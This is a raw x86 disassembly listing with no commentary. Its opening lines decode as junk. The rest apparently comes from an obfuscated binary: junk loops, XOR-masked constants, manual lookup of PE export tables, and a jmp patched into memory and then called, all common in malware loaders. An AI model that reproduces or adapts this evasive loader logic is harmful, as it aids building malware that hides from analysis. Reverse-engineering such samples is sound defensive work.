  422ffb:	push   cs
  422ffc:	ds call 0x20b8:0x66c07b1
  423004:	dec    ebp
  423005:	mov    esi,0xaa8c433a
  42300a:	or     al,0xc0
  42300c:	hlt    
  42300d:	out    dx,eax
  42300e:	pusha  
  42300f:	push   ecx
  423010:	aaa    
  423011:	xchg   dl,dh
  423013:	push   edi
  423014:	rcr    DWORD PTR [edi-0x2],cl
  423017:	pusha  
  423018:	sub    esi,edi
  42301a:	out    0xaf,eax
  42301c:	xchg   edx,eax
  42301d:	sub    dh,BYTE PTR [ebp+0x6298df6d]
  423023:	cdq    
  423024:	adc    DWORD PTR [ecx+ebx*1+0x19],eax
  423028:	sub    DWORD PTR [ebx],0xef7d89fe
  42302e:	fldcw  WORD PTR [ebx+0x3387aa0a]
  423034:	add    al,0xa6
  423036:	loop   0x42307f
  423038:	add    al,0x31
  42303a:	push   ebx
  42303b:	xchg   ebx,eax
  42303c:	out    dx,al
  42303d:	lock retf 0x452b
  423041:	pop    eax
  423042:	jmp    0xbebc:0x4085d894
  423049:	pop    ebx
  42304a:	scas   al,BYTE PTR es:[edi]
  42304b:	pop    ecx
  42304c:	xchg   DWORD PTR [eax+0x23],eax
  42304f:	sbb    eax,0xf9a9ceb8
  423054:	cmc    
  423055:	pop    ecx
  423056:	or     BYTE PTR [ebp+edi*2+0x5350ccfd],al
  42305d:	mov    ah,0xfe
  42305f:	jb     0x423036
  423061:	jb     0x423082
  423063:	mov    ebp,eax
  423065:	xchg   ebx,eax
  423066:	rcr    BYTE PTR [ebp-0x342e0bfd],cl
  42306c:	adc    dh,BYTE PTR [edx]
  42306e:	in     eax,dx
  42306f:	out    dx,al
  423070:	ret    
  423071:	imul   ebp,DWORD PTR [ebx-0x5deb32e1],0x7c
  423078:	hlt    
  423079:	repz (bad) 
  42307b:	mov    ebx,gs
  42307d:	call   0x8cbf3edf
  423082:	cmp    DWORD PTR [esi-0x60505248],esp
  423088:	mov    ah,0xc9
  42308a:	call   0x5e7e:0xd6d8c173
  423091:	test   eax,0x93b7b891
  423096:	push   ds
  423097:	inc    eax
  423098:	push   eax
  423099:	ins    BYTE PTR es:[edi],dx
  42309a:	bound  ecx,QWORD PTR [esi+0x17]
  42309d:	mov    ss,WORD PTR [edi]
  42309f:	fwait
  4230a0:	ins    DWORD PTR es:[edi],dx
  4230a1:	fwait
  4230a2:	xor    BYTE PTR [ebx],ch
  4230a4:	add    ecx,edi
  4230a6:	and    ecx,edx
  4230a8:	mov    DWORD PTR [ebp-0x4c],ecx
  4230ab:	mov    ecx,DWORD PTR [ebp+0x8]
  4230ae:	mov    edx,DWORD PTR [ebp-0x48]
  4230b1:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4230b8:	mov    DWORD PTR [ebp-0x48],ecx
  4230bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4230be:	mov    edx,0xfa5e1524
  4230c3:	sub    edx,ecx
  4230c5:	add    edx,DWORD PTR [ebp-0x44]
  4230c8:	mov    DWORD PTR [ebp-0x44],edx
  4230cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4230ce:	xor    ecx,eax
  4230d0:	add    ecx,esi
  4230d2:	jne    0x421ef2
  4230d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4230db:	xor    ecx,eax
  4230dd:	mov    eax,DWORD PTR [ebp+0x10]
  4230e0:	add    ecx,esi
  4230e2:	mov    DWORD PTR [eax],ecx
  4230e4:	pop    edi
  4230e5:	pop    esi
  4230e6:	pop    ebx
  4230e7:	leave  
  4230e8:	ret    0xc
  4230eb:	push   ebp
  4230ec:	mov    ebp,esp
  4230ee:	sub    esp,0x78
  4230f1:	and    DWORD PTR ds:0x42a2e2,0x0
  4230fb:	jmp    0x42310d
  423100:	mov    ecx,DWORD PTR ds:0x42a2e2
  423106:	inc    ecx
  423107:	mov    DWORD PTR ds:0x42a2e2,ecx
  42310d:	cmp    DWORD PTR ds:0x42a2e2,0x17
  423114:	jae    0x423161
  42311a:	cmp    DWORD PTR ds:0x42a2e2,0xb
  423121:	jbe    0x423161
  423127:	jmp    0x423142
  42312c:	push   DWORD PTR [ebp-0x14]
  42312f:	push   0x42a2be
  423134:	push   0x8b21
  423139:	push   DWORD PTR [ebp-0x1c]
  42313c:	call   DWORD PTR ds:0x42a3d2
  423142:	cmp    DWORD PTR ds:0x42a2e2,0xa
  423149:	jne    0x42315c
  42314f:	mov    ecx,DWORD PTR ds:0x42a2e2
  423155:	inc    ecx
  423156:	mov    DWORD PTR ds:0x42a2e2,ecx
  42315c:	jmp    0x423100
  423161:	push   esi
  423162:	sbb    DWORD PTR ds:0x42a26e,edx
  423168:	push   edi
  423169:	adc    esi,eax
  42316b:	mov    eax,ds:0x42941e
  423170:	inc    DWORD PTR ds:0x42a2ae
  423176:	mov    DWORD PTR [ebp-0x24],eax
  423179:	mov    DWORD PTR ds:0x42a286,0x12e2
  423183:	mov    eax,ds:0x42953e
  423188:	inc    ecx
  423189:	mov    DWORD PTR [ebp-0x30],eax
  42318c:	mov    DWORD PTR ds:0x42a29e,0x10
  423196:	cmp    DWORD PTR ds:0x42a29e,0x0
  42319d:	je     0x4231ff
  4231a3:	cmp    DWORD PTR ds:0x42a29e,0x9
  4231aa:	jbe    0x4231ff
  4231b0:	jmp    0x4231d4
  4231b5:	push   DWORD PTR [ebp-0x24]
  4231b8:	push   DWORD PTR [ebp-0x18]
  4231bb:	push   DWORD PTR [ebp-0xc]
  4231be:	push   0x10f9
  4231c3:	push   DWORD PTR [ebp-0x28]
  4231c6:	push   DWORD PTR [ebp-0x18]
  4231c9:	push   0x429211
  4231ce:	call   DWORD PTR ds:0x42a3d6
  4231d4:	cmp    DWORD PTR ds:0x42a29e,0xa
  4231db:	jne    0x4231ef
  4231e1:	xor    eax,eax
  4231e3:	xor    eax,DWORD PTR ds:0x42a29e
  4231e9:	dec    eax
  4231ea:	mov    ds:0x42a29e,eax
  4231ef:	mov    eax,ds:0x42a29e
  4231f4:	dec    eax
  4231f5:	mov    ds:0x42a29e,eax
  4231fa:	jmp    0x423196
  4231ff:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  423206:	mov    DWORD PTR ds:0x42a26a,0x16
  423210:	cmp    DWORD PTR ds:0x42a26a,0x0
  423217:	je     0x423249
  42321d:	cmp    DWORD PTR ds:0x42a26a,0x20
  423224:	jg     0x423249
  42322a:	jmp    0x423235
  42322f:	call   DWORD PTR ds:0x42a3da
  423235:	xor    edi,edi
  423237:	add    edi,DWORD PTR ds:0x42a26a
  42323d:	dec    edi
  42323e:	mov    DWORD PTR ds:0x42a26a,edi
  423244:	jmp    0x423210
  423249:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  423250:	mov    eax,DWORD PTR [ebp-0x10]
  423253:	mov    ecx,DWORD PTR [ebp-0x10]
  423256:	xor    esi,esi
  423258:	xor    esi,DWORD PTR ds:0x42a286
  42325e:	xor    DWORD PTR ds:0x42a2f6,esi
  423264:	sub    eax,ecx
  423266:	or     ecx,esi
  423268:	mov    DWORD PTR [ebp-0x10],eax
  42326b:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  423272:	add    DWORD PTR ds:0x42a26a,0x2e29
  42327c:	mov    eax,DWORD PTR [ebp-0x18]
  42327f:	sbb    DWORD PTR ds:0x42a272,0x6ecf
  423289:	mov    ecx,DWORD PTR [ebp-0x18]
  42328c:	add    DWORD PTR ds:0x42a256,0x42a29a
  423296:	sub    eax,ecx
  423298:	adc    DWORD PTR ds:0x42a302,edi
  42329e:	mov    DWORD PTR [ebp-0x18],eax
  4232a1:	add    DWORD PTR ds:0x42a2fe,ecx
  4232a7:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4232ae:	adc    DWORD PTR ds:0x42a26a,0x287e
  4232b8:	mov    eax,DWORD PTR [ebp-0xc]
  4232bb:	adc    esi,esi
  4232bd:	mov    ecx,DWORD PTR [ebp-0xc]
  4232c0:	sub    eax,ecx
  4232c2:	xor    DWORD PTR ds:0x42a2b6,0x51ed
  4232cc:	mov    DWORD PTR [ebp-0xc],eax
  4232cf:	and    DWORD PTR ds:0x42a2ae,0x0
  4232d9:	mov    edi,DWORD PTR ds:0x42a2ae
  4232df:	inc    edi
  4232e0:	mov    DWORD PTR ds:0x42a2ae,edi
  4232e6:	cmp    DWORD PTR ds:0x42a2ae,0xd
  4232ed:	ja     0x423337
  4232f3:	jmp    0x42330e
  4232f8:	push   DWORD PTR [ebp-0x1c]
  4232fb:	push   0x7962
  423300:	push   0x7f76
  423305:	push   DWORD PTR [ebp-0x20]
  423308:	call   DWORD PTR ds:0x42a3de
  42330e:	cmp    DWORD PTR ds:0x42a2ae,0xc
  423315:	jne    0x42332a
  42331b:	xor    edi,edi
  42331d:	xor    edi,DWORD PTR ds:0x42a2ae
  423323:	inc    edi
  423324:	mov    DWORD PTR ds:0x42a2ae,edi
  42332a:	cmp    DWORD PTR ds:0x42a2ae,0x18
  423331:	jb     0x4232d9
  423337:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42333e:	adc    esi,edi
  423340:	mov    eax,DWORD PTR [ebp-0x1c]
  423343:	mov    ecx,DWORD PTR [ebp-0x1c]
  423346:	sub    eax,ecx
  423348:	mov    DWORD PTR [ebp-0x1c],eax
  42334b:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  423352:	mov    eax,DWORD PTR [ebp-0x20]
  423355:	mov    ecx,DWORD PTR [ebp-0x20]
  423358:	sub    eax,ecx
  42335a:	mov    DWORD PTR [ebp-0x20],eax
  42335d:	mov    eax,DWORD PTR [ebp-0x2c]
  423360:	mov    ecx,DWORD PTR [ebp-0x20]
  423363:	mov    esi,0x75108aa
  423368:	xor    eax,esi
  42336a:	mov    edi,0x3272f1
  42336f:	add    eax,edi
  423371:	or     eax,ecx
  423373:	mov    DWORD PTR [ebp-0x20],eax
  423376:	mov    eax,DWORD PTR [ebp-0x4]
  423379:	mov    ecx,DWORD PTR [ebp-0x4]
  42337c:	sub    eax,ecx
  42337e:	mov    DWORD PTR [ebp-0x4],eax
  423381:	or     DWORD PTR [ebp-0x4],0xf89c85be
  423388:	mov    eax,DWORD PTR [ebp-0xc]
  42338b:	xor    eax,esi
  42338d:	add    eax,edi
  42338f:	push   eax
  423390:	mov    eax,DWORD PTR [ebp-0x10]
  423393:	xor    eax,esi
  423395:	add    eax,edi
  423397:	push   eax
  423398:	mov    eax,DWORD PTR [ebp-0x4]
  42339b:	xor    eax,esi
  42339d:	add    eax,edi
  42339f:	push   eax
  4233a0:	lea    eax,[ebp-0x78]
  4233a3:	push   eax
  4233a4:	push   DWORD PTR [ebp-0x2c]
  4233a7:	push   DWORD PTR [ebp-0x28]
  4233aa:	call   0x413da8
  4233af:	test   eax,eax
  4233b1:	je     0x4233df
  4233b7:	lea    eax,[ebp-0x78]
  4233ba:	push   eax
  4233bb:	mov    eax,DWORD PTR [ebp-0x28]
  4233be:	xor    eax,esi
  4233c0:	add    eax,edi
  4233c2:	push   eax
  4233c3:	mov    eax,DWORD PTR [ebp-0x24]
  4233c6:	add    eax,0xaa
  4233cb:	push   eax
  4233cc:	mov    eax,DWORD PTR [ebp-0x24]
  4233cf:	mov    eax,DWORD PTR [eax+0x198]
  4233d5:	push   DWORD PTR [eax]
  4233d7:	call   0x4084f6
  4233dc:	mov    DWORD PTR [ebp-0x14],eax
  4233df:	mov    ecx,DWORD PTR ds:0x429516
  4233e5:	lea    eax,[ebp+0x4]
  4233e8:	mov    DWORD PTR [ecx*4+0x42950e],eax
  4233ef:	inc    DWORD PTR ds:0x429516
  4233f5:	mov    eax,DWORD PTR [ebp-0x14]
  4233f8:	test   eax,eax
  4233fa:	je     0x423462
  423400:	lea    eax,[ebp-0x8]
  423403:	mov    DWORD PTR [ebp-0x34],eax
  423406:	mov    eax,DWORD PTR [ebp-0x30]
  423409:	mov    DWORD PTR [ebp-0x8],eax
  42340c:	mov    eax,DWORD PTR [ebp-0x8]
  42340f:	mov    ecx,DWORD PTR [ebp-0x14]
  423412:	sub    eax,ecx
  423414:	mov    DWORD PTR [ebp-0x8],eax
  423417:	mov    ecx,DWORD PTR [ebp-0x4]
  42341a:	xor    ecx,esi
  42341c:	mov    eax,0xffcd8d0f
  423421:	sub    eax,ecx
  423423:	add    DWORD PTR [ebp-0x8],eax
  423426:	mov    eax,DWORD PTR [ebp-0x8]
  423429:	mov    ecx,DWORD PTR [ebp-0x14]
  42342c:	mov    DWORD PTR [ecx+0x1],eax
  42342f:	mov    eax,DWORD PTR [ebp-0x14]
  423432:	push   DWORD PTR [ebp-0x24]
  423435:	mov    BYTE PTR [eax],0xe9
  423438:	mov    eax,ds:0x42929a
  42343d:	push   DWORD PTR [eax]
  42343f:	push   DWORD PTR ds:0x4294fe
  423445:	push   DWORD PTR ds:0x4292a2
  42344b:	push   DWORD PTR ds:0x4294de
  423451:	push   DWORD PTR ds:0x42a04a
  423457:	push   DWORD PTR [ebp-0x28]
  42345a:	push   DWORD PTR [ebp-0x2c]
  42345d:	mov    eax,DWORD PTR [ebp-0x14]
  423460:	call   eax
  423462:	pop    edi
  423463:	pop    esi
  423464:	leave  
  423465:	ret    
  423466:	push   ebp
  423467:	mov    ebp,esp
  423469:	sub    esp,0x1c
  42346c:	mov    DWORD PTR ds:0x42a2ea,0x10
  423476:	cmp    DWORD PTR ds:0x42a2ea,0x0
  42347d:	je     0x4234ad
  423483:	cmp    DWORD PTR ds:0x42a2ea,0x17
  42348a:	jg     0x4234ad
  423490:	jmp    0x42349b
  423495:	call   DWORD PTR ds:0x42a3e2
  42349b:	mov    ecx,DWORD PTR ds:0x42a2ea
  4234a1:	dec    ecx
  4234a2:	mov    DWORD PTR ds:0x42a2ea,ecx
  4234a8:	jmp    0x423476
  4234ad:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4234b4:	sbb    ecx,ecx
  4234b6:	lea    eax,[ebp+0x14]
  4234b9:	sub    edx,DWORD PTR ds:0x42a2da
  4234bf:	mov    DWORD PTR [ebp-0x4],eax
  4234c2:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4234c9:	and    DWORD PTR ds:0x42a302,0x5581
  4234d3:	lea    eax,[ebp-0xc]
  4234d6:	and    DWORD PTR ds:0x42a256,0x0
  4234e0:	jmp    0x4234f4
  4234e5:	xor    ecx,ecx
  4234e7:	or     ecx,DWORD PTR ds:0x42a256
  4234ed:	inc    ecx
  4234ee:	mov    DWORD PTR ds:0x42a256,ecx
  4234f4:	cmp    DWORD PTR ds:0x42a256,0x1e
  4234fb:	jae    0x42354c
  423501:	cmp    DWORD PTR ds:0x42a256,0x4
  423508:	jg     0x42354c
  42350e:	jmp    0x42352d
  423513:	push   0x42a25a
  423518:	push   0x6352
  42351d:	push   0x429009
  423522:	push   0x42904c
  423527:	call   DWORD PTR ds:0x42a3ea
  42352d:	cmp    DWORD PTR ds:0x42a256,0x3
  423534:	jne    0x423547
  42353a:	mov    ecx,DWORD PTR ds:0x42a256
  423540:	inc    ecx
  423541:	mov    DWORD PTR ds:0x42a256,ecx
  423547:	jmp    0x4234e5
  42354c:	mov    DWORD PTR [ebp-0x14],eax
  42354f:	and    DWORD PTR ds:0x42a2f2,0x0
  423559:	jmp    0x42356c
  42355e:	xor    eax,eax
  423560:	add    eax,DWORD PTR ds:0x42a2f2
  423566:	inc    eax
  423567:	mov    ds:0x42a2f2,eax
  42356c:	cmp    DWORD PTR ds:0x42a2f2,0x16
  423573:	jae    0x4235a5
  423579:	cmp    DWORD PTR ds:0x42a2f2,0x1d
  423580:	jbe    0x4235a5
  423586:	jmp    0x4235a0
  42358b:	push   0x76a3
  423590:	push   0x42a296
  423595:	push   0x659d
  42359a:	call   DWORD PTR ds:0x42a3ee
  4235a0:	jmp    0x42355e
  4235a5:	mov    eax,DWORD PTR [ebp-0xc]
  4235a8:	mov    edx,DWORD PTR [ebp-0x14]
  4235ab:	neg    ecx
  4235ad:	mov    ecx,0x75108aa
  4235b2:	xor    eax,ecx
  4235b4:	or     DWORD PTR ds:0x42a2c2,0x55df
  4235be:	add    eax,0x3272f1
  4235c3:	mov    DWORD PTR [edx],eax
  4235c5:	xor    edx,edx
  4235c7:	xor    edx,DWORD PTR ds:0x42a34a
  4235cd:	xor    eax,eax
  4235cf:	or     eax,DWORD PTR ds:0x42a35a
  4235d5:	sub    edx,eax
  4235d7:	sub    edx,DWORD PTR [edx+eax*1]
  4235da:	mov    eax,ds:0x429296
  4235df:	mov    DWORD PTR ds:0x42a2da,0x16
  4235e9:	cmp    DWORD PTR ds:0x42a2da,0x0
  4235f0:	je     0x423628
  4235f6:	cmp    DWORD PTR ds:0x42a2da,0x1d
  4235fd:	jge    0x423628
  423603:	jmp    0x423616
  423608:	push   DWORD PTR [ebp-0x20]
  42360b:	push   0x42a2ca
  423610:	call   DWORD PTR ds:0x42a3f2
  423616:	mov    edx,DWORD PTR ds:0x42a2da
  42361c:	dec    edx
  42361d:	mov    DWORD PTR ds:0x42a2da,edx
  423623:	jmp    0x4235e9
  423628:	mov    edx,DWORD PTR [ebp-0x4]
  42362b:	adc    DWORD PTR ds:0x42a2be,0x42a256
  423635:	mov    eax,DWORD PTR [eax]
  423637:	and    DWORD PTR ds:0x42a286,0x12f2
  423641:	add    eax,DWORD PTR [edx]
  423643:	push   esi
  423644:	mov    DWORD PTR [ebp-0x8],eax
  423647:	and    DWORD PTR ds:0x42a2f6,0x290a
  423651:	mov    edx,DWORD PTR [ebp+0x8]
  423654:	mov    eax,ds:0x42941e
  423659:	sbb    esi,0x612f
  42365f:	mov    eax,DWORD PTR [eax+0x198]
  423665:	xor    edx,ecx
  423667:	neg    esi
  423669:	mov    esi,0x3272f1
  42366e:	add    edx,esi
  423670:	mov    DWORD PTR ds:0x42a2b6,0x4be9
  42367a:	cmp    DWORD PTR [eax],edx
  42367c:	je     0x42369d
  423682:	mov    DWORD PTR ds:0x42a2ea,0x6dae
  42368c:	mov    eax,DWORD PTR [eax]
  42368e:	mov    DWORD PTR ds:0x42a2da,0x1950
  423698:	jmp    0x423ae0
  42369d:	sbb    eax,DWORD PTR ds:0x42a296
  4236a3:	mov    eax,DWORD PTR [ebp+0x18]
  4236a6:	xor    eax,ecx
  4236a8:	adc    DWORD PTR ds:0x42a2e6,0x42a2b2
  4236b2:	push   ebx
  4236b3:	add    eax,esi
  4236b5:	add    ebx,DWORD PTR ds:0x42a2a2
  4236bb:	xor    edx,edx
  4236bd:	mov    ebx,DWORD PTR ds:0x42a2c6
  4236c3:	xor    DWORD PTR ds:0x42a2a2,ebx
  4236c9:	mov    ebx,0xfabdbed8
  4236ce:	adc    DWORD PTR ds:0x42a2ae,0x6fd6
  4236d8:	add    eax,ebx
  4236da:	mov    DWORD PTR ds:0x42a296,0x25f1
  4236e4:	push   edi
  4236e5:	mov    DWORD PTR ds:0x42a2be,0x342
  4236ef:	adc    edx,0xffffffff
  4236f2:	and    DWORD PTR ds:0x42a2ee,0x0
  4236fc:	jmp    0x42370e
  423701:	mov    edi,DWORD PTR ds:0x42a2ee
  423707:	inc    edi
  423708:	mov    DWORD PTR ds:0x42a2ee,edi
  42370e:	cmp    DWORD PTR ds:0x42a2ee,0x10
  423715:	jae    0x423757
  42371b:	cmp    DWORD PTR ds:0x42a2ee,0x6
  423722:	jbe    0x423757
  423728:	jmp    0x423738
  42372d:	push   0x42a2fe
  423732:	call   DWORD PTR ds:0x42a3f6
  423738:	cmp    DWORD PTR ds:0x42a2ee,0x5
  42373f:	jne    0x423752
  423745:	mov    edi,DWORD PTR ds:0x42a2ee
  42374b:	inc    edi
  42374c:	mov    DWORD PTR ds:0x42a2ee,edi
  423752:	jmp    0x423701
  423757:	mov    edi,0x8a29a13d
  42375c:	mov    DWORD PTR ds:0x42a25e,0x2bce
  423766:	xor    eax,edi
  423768:	sub    DWORD PTR ds:0x42a266,0x304b
  423772:	xor    edx,0x0
  423775:	mov    DWORD PTR ds:0x42a2b2,0x550
  42377f:	cmp    eax,0x70941fe5
  423784:	mov    DWORD PTR ds:0x42a2c2,0x6d49
  42378e:	jne    0x4237c5
  423794:	mov    DWORD PTR ds:0x42a2fa,0x2c4a
  42379e:	cmp    edx,0xffffffff
  4237a1:	mov    DWORD PTR ds:0x42a2de,0x7cde
  4237ab:	jne    0x4237c5
  4237b1:	push   0xf89c85ba
  4237b6:	mov    DWORD PTR ds:0x42a2ca,0x25f0
  4237c0:	jmp    0x423acd
  4237c5:	xor    DWORD PTR ds:0x42a2e2,edi
  4237cb:	mov    eax,DWORD PTR [ebp+0x18]
  4237ce:	and    DWORD PTR ds:0x42a25a,0x42a296
  4237d8:	xor    eax,ecx
  4237da:	add    eax,esi
  4237dc:	sub    DWORD PTR ds:0x42a292,0x6866
  4237e6:	xor    edx,edx
  4237e8:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  4237f2:	add    eax,ebx
  4237f4:	mov    DWORD PTR ds:0x42a2f6,0x1dc4
  4237fe:	adc    edx,0xffffffff
  423801:	not    DWORD PTR ds:0x42a2ae
  423807:	xor    eax,edi
  423809:	xor    edx,0x0
  42380c:	cmp    eax,0x70941fe7
  423811:	jne    0x423aba
  423817:	cmp    edx,0xffffffff
  42381a:	jne    0x423aba
  423820:	mov    eax,DWORD PTR [ebp+0x10]
  423823:	xor    eax,ecx
  423825:	mov    DWORD PTR ds:0x42a2aa,0x16
  42382f:	cmp    DWORD PTR ds:0x42a2aa,0x0
  423836:	je     0x423873
  42383c:	cmp    DWORD PTR ds:0x42a2aa,0x25
  423843:	jbe    0x423873
  423849:	jmp    0x423861
  42384e:	push   0x1425
  423853:	push   0x42a2b6
  423858:	push   DWORD PTR [ebp-0x14]
  42385b:	call   DWORD PTR ds:0x42a3fa
  423861:	mov    edx,DWORD PTR ds:0x42a2aa
  423867:	dec    edx
  423868:	mov    DWORD PTR ds:0x42a2aa,edx
  42386e:	jmp    0x42382f
  423873:	add    eax,esi
  423875:	mov    edx,DWORD PTR ds:0x42a292
  42387b:	sbb    edx,DWORD PTR ds:0x42a2de
  423881:	mov    DWORD PTR ds:0x42a292,edx
  423887:	mov    DWORD PTR [ebp-0x18],eax
  42388a:	and    DWORD PTR ds:0x42a2b6,0x0
  423894:	jmp    0x4238a4
  423899:	mov    eax,ds:0x42a2b6
  42389e:	inc    eax
  42389f:	mov    ds:0x42a2b6,eax
  4238a4:	cmp    DWORD PTR ds:0x42a2b6,0x13
  4238ab:	jae    0x4238d9
  4238b1:	cmp    DWORD PTR ds:0x42a2b6,0x17
  4238b8:	ja     0x4238d9
  4238be:	jmp    0x4238d4
  4238c3:	push   0x3d13
  4238c8:	push   DWORD PTR [ebp-0x14]
  4238cb:	push   DWORD PTR [ebp-0x14]
  4238ce:	call   DWORD PTR ds:0x42a402
  4238d4:	jmp    0x423899
  4238d9:	mov    eax,DWORD PTR [ebp+0xc]
  4238dc:	mov    edx,DWORD PTR [ebp-0x8]
  4238df:	xor    eax,ecx
  4238e1:	not    DWORD PTR ds:0x42a2ea
  4238e7:	add    eax,esi
  4238e9:	imul   eax,DWORD PTR [edx]
  4238ec:	dec    edx
  4238ed:	mov    edx,DWORD PTR [ebp+0x8]
  4238f0:	xor    edx,ecx
  4238f2:	add    edx,esi
  4238f4:	cmp    edx,eax
  4238f6:	mov    eax,DWORD PTR [ebp-0x4]
  4238f9:	mov    DWORD PTR ds:0x42a26a,0x1fb7
  423903:	je     0x423937
  423909:	mov    edx,DWORD PTR [ebp-0x18]
  42390c:	add    DWORD PTR [eax],edx
  42390e:	mov    eax,DWORD PTR [ebp-0x4]
  423911:	mov    edx,DWORD PTR [ebp+0xc]
  423914:	xor    edx,ecx
  423916:	add    edx,esi
  423918:	imul   edx,DWORD PTR [eax]
  42391b:	mov    DWORD PTR [eax],edx
  42391d:	mov    eax,DWORD PTR [ebp-0x4]
  423920:	mov    DWORD PTR [ebp-0x1c],eax
  423923:	mov    eax,DWORD PTR [ebp+0x10]
  423926:	xor    eax,ecx
  423928:	mov    edx,0xffcd8d0f
  42392d:	sub    edx,eax
  42392f:	mov    eax,DWORD PTR [ebp-0x1c]
  423932:	jmp    0x423951
  423937:	mov    edx,DWORD PTR [ebp+0x14]
  42393a:	xor    DWORD PTR [eax],edx
  42393c:	mov    eax,DWORD PTR [ebp-0x4]
  42393f:	mov    DWORD PTR [ebp-0x1c],eax
  423942:	mov    eax,DWORD PTR [ebp+0x10]
  423945:	xor    eax,ecx
  423947:	mov    edx,0xffcd8d0f
  42394c:	sub    edx,eax
  42394e:	mov    eax,DWORD PTR [ebp-0x1c]
  423951:	add    DWORD PTR [eax],edx
  423953:	mov    eax,DWORD PTR [ebp-0x4]
  423956:	mov    edx,DWORD PTR [ebp-0x8]
  423959:	add    edx,DWORD PTR [eax]
  42395b:	mov    DWORD PTR [ebp-0x8],edx
  42395e:	mov    eax,DWORD PTR [ebp+0xc]
  423961:	mov    edx,DWORD PTR [ebp+0xc]
  423964:	xor    edx,ecx
  423966:	xor    eax,ecx
  423968:	lea    eax,[eax+edx*1+0x64e5e2]
  42396f:	mov    edx,DWORD PTR [ebp+0xc]
  423972:	xor    edx,ecx
  423974:	add    edx,esi
  423976:	imul   eax,edx
  423979:	mov    edx,DWORD PTR [ebp+0xc]
  42397c:	xor    edx,ecx
  42397e:	sub    edx,eax
  423980:	mov    eax,DWORD PTR [ebp-0x4]
  423983:	add    edx,esi
  423985:	cmp    DWORD PTR [eax],edx
  423987:	mov    eax,DWORD PTR [ebp-0x4]
  42398a:	jg     0x4239a7
  423990:	mov    DWORD PTR [ebp-0x1c],eax
  423993:	mov    eax,DWORD PTR [ebp+0x10]
  423996:	xor    eax,ecx
  423998:	mov    edx,0xffcd8d0f
  42399d:	sub    edx,eax
  42399f:	mov    eax,DWORD PTR [ebp-0x1c]
  4239a2:	jmp    0x4239ae
  4239a7:	mov    edx,DWORD PTR [ebp+0x10]
  4239aa:	xor    edx,ecx
  4239ac:	add    edx,esi
  4239ae:	add    DWORD PTR [eax],edx
  4239b0:	mov    eax,DWORD PTR [ebp-0x8]
  4239b3:	mov    edx,DWORD PTR [ebp-0x10]
  4239b6:	mov    eax,DWORD PTR [eax]
  4239b8:	xor    edx,ecx
  4239ba:	add    edx,0x3272f0
  4239c0:	not    edx
  4239c2:	and    eax,edx
  4239c4:	mov    DWORD PTR [ebp-0x4],eax
  4239c7:	movsx  eax,BYTE PTR [eax+0x1]
  4239cb:	cdq    
  4239cc:	add    eax,ebx
  4239ce:	adc    edx,0xffffffff
  4239d1:	xor    eax,edi
  4239d3:	xor    edx,0x0
  4239d6:	cmp    eax,0x70941e0f
  4239db:	jne    0x423a0f
  4239e1:	cmp    edx,0xffffffff
  4239e4:	jne    0x423a0f
  4239ea:	mov    eax,DWORD PTR [ebp-0x4]
  4239ed:	movsx  eax,BYTE PTR [eax]
  4239f0:	cdq    
  4239f1:	add    eax,ebx
  4239f3:	adc    edx,0xffffffff
  4239f6:	xor    eax,edi
  4239f8:	xor    edx,0x0
  4239fb:	cmp    eax,0x70941e18
  423a00:	jne    0x423a0f
  423a06:	cmp    edx,0xffffffff
  423a09:	je     0x423a26
  423a0f:	mov    eax,DWORD PTR [ebp-0x10]
  423a12:	xor    eax,ecx
  423a14:	mov    edx,0xffcd8d0f
  423a19:	sub    edx,eax
  423a1b:	add    DWORD PTR [ebp-0x4],edx
  423a1e:	mov    eax,DWORD PTR [ebp-0x4]
  423a21:	jmp    0x4239c7
  423a26:	mov    eax,DWORD PTR [ebp-0x14]
  423a29:	mov    eax,DWORD PTR [eax]
  423a2b:	mov    edx,DWORD PTR [ebp-0x4]
  423a2e:	mov    edx,DWORD PTR [edx+0x3c]
  423a31:	lea    eax,[edx+eax*8+0x78]
  423a35:	mov    edx,DWORD PTR [ebp-0x4]
  423a38:	mov    eax,DWORD PTR [eax+edx*1]
  423a3b:	mov    DWORD PTR [ebp-0x8],eax
  423a3e:	mov    eax,DWORD PTR [ebp+0x8]
  423a41:	xor    eax,ecx
  423a43:	add    eax,esi
  423a45:	mov    DWORD PTR [ebp-0x14],eax
  423a48:	mov    eax,DWORD PTR [ebp+0x8]
  423a4b:	mov    edx,DWORD PTR [ebp-0x8]
  423a4e:	xor    eax,ecx
  423a50:	add    eax,esi
  423a52:	cmp    edx,eax
  423a54:	jne    0x423a72
  423a5a:	mov    eax,DWORD PTR [ebp+0xc]
  423a5d:	xor    eax,ecx
  423a5f:	mov    ecx,DWORD PTR [ebp-0x8]
  423a62:	add    eax,esi
  423a64:	imul   eax,ecx
  423a67:	mov    DWORD PTR [ebp-0x8],eax
  423a6a:	push   DWORD PTR [ebp+0x18]
  423a6d:	jmp    0x423acd
  423a72:	mov    eax,DWORD PTR [ebp-0x8]
  423a75:	mov    ecx,DWORD PTR [ebp-0x4]
  423a78:	add    eax,ecx
  423a7a:	mov    DWORD PTR [ebp-0x14],eax
  423a7d:	mov    eax,DWORD PTR [ebp-0x14]
  423a80:	mov    eax,DWORD PTR [eax+0xc]
  423a83:	movsx  eax,BYTE PTR [eax+ecx*1]
  423a87:	cdq    
  423a88:	add    eax,ebx
  423a8a:	adc    edx,0xffffffff
  423a8d:	xor    eax,edi
  423a8f:	xor    edx,0x0
  423a92:	cmp    eax,0x70941e1e
  423a97:	jne    0x423a6a
  423a9d:	cmp    edx,0xffffffff
  423aa0:	jne    0x423a6a
  423aa6:	mov    eax,ds:0x42941e
  423aab:	mov    eax,DWORD PTR [eax+0x198]
  423ab1:	mov    DWORD PTR [eax],ecx
  423ab3:	mov    eax,ecx
  423ab5:	jmp    0x423ade
  423aba:	mov    eax,DWORD PTR [ebp+0x18]
  423abd:	cmp    eax,0xf89c85ba
  423ac2:	jne    0x423ade
  423ac8:	push   0xf89c85bb
